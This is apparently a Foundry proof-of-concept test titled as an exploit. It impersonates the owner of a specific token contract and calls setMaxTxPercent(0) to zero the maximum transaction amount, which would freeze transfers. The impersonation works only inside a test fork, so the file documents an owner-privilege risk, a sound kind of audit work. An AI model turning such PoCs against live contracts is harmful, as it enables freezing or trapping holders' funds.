// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFLOV {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxAmount) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA1E6F584E0d7EEc74F553E9a7B64a4DeD8A4b61;
    address attacker = address(this);
    IFLOV target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IFLOV(TARGET);
        owner = target.owner();

        // Pre-condition check to ensure _maxTxAmount is initially greater than 0
        assertGt(target._maxTxAmount(), 0, "Pre-condition failed: _maxTxAmount is already 0");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        target.setMaxTxPercent(0);
        vm.stopPrank();
        assertEq(target._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
